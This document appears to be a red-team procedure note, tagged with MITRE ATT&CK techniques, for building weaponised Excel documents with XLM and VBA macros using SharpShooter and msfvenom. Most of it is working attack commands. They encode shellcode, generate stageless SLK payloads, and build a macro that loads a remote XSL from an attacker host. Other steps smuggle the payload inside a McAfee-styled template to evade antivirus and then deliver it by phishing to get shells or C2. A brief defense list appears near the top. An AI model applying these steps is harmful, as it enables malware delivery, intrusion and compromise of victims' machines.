---
type: procedure
verified: true
submitted: false
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Office Application Startup|T1137 - Office Application Startup]]'
sub_techniques:
  - '[[sub-techniques/PowerShell|T1059.001 - PowerShell]]'
tags:
  - '[[tags/office-attacks]]'
  - '[[tags/xlm-excel-4-sharpshooter]]'
commands:
  - '[[commands/sharpshooter-create-stageless-slk-payload]]'
  - '[[commands/sharpshooter-create-vba-macro-with-xmldom]]'
  - '[[commands/sharpshooter-create-slk-macro-with-custom-shellcode]]'
platforms:
  - Windows
tools:
  - '[[tools/SharpShooter]]'
  - '[[tools/msfvenom]]'
validated: true
---

# XLM Excel 4.0 Macro SharpShooter Payload Creation

## Summary

This procedure details the creation of malicious Excel documents leveraging XLM (Excel 4.0) macros combined with the SharpShooter tool to generate and embed payloads. It enables attackers to bypass traditional VBA macro detection mechanisms in Microsoft Office, facilitating initial access and code execution on victim systems when the document is opened.

## Description

XLM macros, an older Excel 4.0 format, can execute code upon document opening and are often overlooked by modern security tools focused on VBA. SharpShooter is a payload generation framework that creates obfuscated .NET payloads, which can be embedded into XLM-enabled SLK (Symbolic Link) files or VBA macros using techniques like XMLDOM for remote loading. This procedure covers generating stageless payloads, VBA macros via COM interfaces, and SLK documents with custom shellcode smuggling. It targets Windows environments with Microsoft Excel installed, assuming the victim enables content or has macros permitted. The resulting documents can deliver shellcode for reverse shells, persistence, or further exploitation. Prerequisites include a shellcode file (e.g., generated via msfvenom) and the SharpShooter tool. If the payload requires encoding to avoid null bytes, use msfvenom preprocessing.

## Requirements

1. SharpShooter tool installed and accessible via Python (pip install or git clone from repository).
2. msfvenom (part of Metasploit Framework) for generating and encoding shellcode.
3. A raw shellcode file (e.g., x86 Windows shellcode in binary format, no null bytes).
4. Python 3.x environment on the attacker's machine.
5. Optional: A web server to host remote XSL files for XMLDOM-based macros.

## Defense

- Enable macro security settings in Microsoft Office to disable all macros by default or prompt for user approval.
- Deploy endpoint detection tools that scan for XLM macros and anomalous Excel behaviors (e.g., network connections from Office apps).
- Use application whitelisting to block unsigned or suspicious macro execution.
- Educate users on phishing risks and verifying attachments before opening.
- Monitor for SharpShooter artifacts like specific file extensions (.slk) or command-line invocations of Python scripts with payload flags.

## Objectives

1. Generate obfuscated payloads using SharpShooter to evade antivirus detection.
2. Embed payloads into Excel-compatible formats (SLK or VBA) for delivery via phishing.
3. Achieve code execution on the victim machine upon document opening, establishing initial access.
4. Optionally establish persistence through auto-start mechanisms in Office applications.

## Instructions

### Step 1: Prepare Encoded Shellcode

**Context**: Generate or encode raw shellcode to avoid detection issues like null bytes, using msfvenom. This step ensures compatibility with SharpShooter's stageless payload mode. If you already have a clean shellcode file, skip encoding.

**Command** (msfvenom-generate-encoded-shellcode):
```bash
msfvenom -p generic/custom PAYLOADFILE=$_SHELLCODE_FILE -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o $_OUTPUT_SHELLCODE_FILE -b '\x00'
```

> This command loads a custom payload file, applies Shikata Ga Nai encoding for x86 Windows, outputs raw bytes without nulls, and saves to a temporary file. Replace $_SHELLCODE_FILE with your input (e.g., payload86.bin) and $_OUTPUT_SHELLCODE_FILE with the encoded output path (e.g., /tmp/shellcode-86.bin). Expected output is a binary file ready for SharpShooter; verify file size and lack of null bytes using hexdump.

### Step 2: Create Stageless SLK Payload

**Context**: Use SharpShooter to generate a basic stageless XLM payload from raw shellcode. This creates an SLK file that can be imported into Excel for macro execution. Ideal for simple delivery without additional smuggling.

**Command** ([[commands/sharpshooter-create-stageless-slk-payload]]):
```bash
python SharpShooter.py --payload slk --rawscfile $_SHELLCODE_FILE --output $_OUTPUT_FILE
```

> Invoke SharpShooter in Python to build an SLK payload. The --rawscfile flag points to your shellcode (e.g., shellcode.bin), and --output specifies the base name (e.g., test). If the shellcode contains issues, the process fails—check logs. Expected output: An SLK file (test.slk) containing embedded XLM macros with the payload; open in Excel to verify auto-execution (test in a sandbox).

### Step 3: Create VBA Macro with XMLDOM COM Interface

**Context**: For scenarios requiring remote payload loading, generate a VBA macro that uses the XMLDOM COM object to fetch and execute an XSL stylesheet from a controlled server. This adds indirection to bypass local scans. Ensure your web server hosts the XSL file beforehand.

**Command** ([[commands/sharpshooter-create-vba-macro-with-xmldom]]):
```bash
python SharpShooter.py --stageless --dotnetver 2 --payload macro --output $_OUTPUT_FILE --rawscfile $_SHELLCODE_FILE --com xslremote --awlurl $_XSL_URL
```

> This builds a stageless VBA macro targeting .NET 2.0, using XMLDOM for remote XSL loading. Specify --rawscfile (e.g., ./x86payload.bin), --output (e.g., foo), and --awlurl (e.g., http://192.168.2.8:8080/foo.xsl). If the URL is unreachable during testing, the macro fails gracefully. Expected output: A macro-enabled document (foo.xlsm or similar) with VBA code; inspect in VBA editor to confirm XMLDOM references, and test execution shows remote fetch success.

### Step 4: Create SLK Macro Document with Custom Shellcode and Smuggling

**Context**: For advanced evasion, create an SLK document with smuggling (embedding in legitimate templates) and custom shellcode. Use a template like McAfee to mimic benign files. This step assumes encoded shellcode from Step 1.

**Command** ([[commands/sharpshooter-create-slk-macro-with-custom-shellcode]]):
```bash
python SharpShooter.py --payload slk --output $_OUTPUT_FILE --rawscfile $_SHELLCODE_FILE --smuggle --template $_TEMPLATE
```

> Generate the SLK with smuggling enabled and a specific template (e.g., --template mcafee). Use --rawscfile for your encoded shellcode (e.g., /tmp/shellcode-86.bin) and --output (e.g., foo). If smuggling fails due to template issues, fallback to default. Expected output: An obfuscated SLK file (foo.slk) blended with template content; import into Excel and monitor for payload execution (e.g., network callback if shellcode is a reverse shell).

### Step 5: Verify and Deliver Payload

**Context**: Test the generated document in a controlled environment to ensure execution without alerts. If successful, package for delivery (e.g., email attachment). Decision point: If AV detects it, iterate with different templates or encodings.

**Instructions**: Open the SLK/XLSM file in Excel on a test VM with macro support enabled. Monitor process creation (e.g., via ProcMon) and network traffic for payload indicators. If no execution, check shellcode integrity or macro permissions.

> No specific command here; use Excel directly. Expected output: Successful payload execution (e.g., shell spawn or C2 connection). If issues, debug by extracting macros via Office tools.
